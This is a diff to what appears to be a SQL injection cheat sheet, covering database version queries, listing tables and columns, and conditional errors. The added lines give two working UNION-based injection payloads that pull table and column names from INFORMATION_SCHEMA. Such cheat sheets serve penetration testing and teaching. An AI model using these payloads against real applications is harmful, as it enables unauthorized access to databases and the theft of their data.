@@ -103,7 +103,7 @@ SELECT @@version
 ```
 
 ## Database contents
-You can list the tables that exist in the database, and the columns that those tables contain. One column you can use is `TABLE_NAME`
+You can list the tables that exist in the database, and the columns that those tables contain.
 
 Oracle
 ```
@@ -125,6 +125,12 @@ MySQL
 SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ```
+
+Use following query to get table_names or column_names:
+1. `' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES--`
+2. `' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table_name>'--
+
+**The table name in 2nd query needs to be in qoutes.**
 
 ## Conditional errors
 You can test a single boolean condition and trigger a database error if the condition is true.
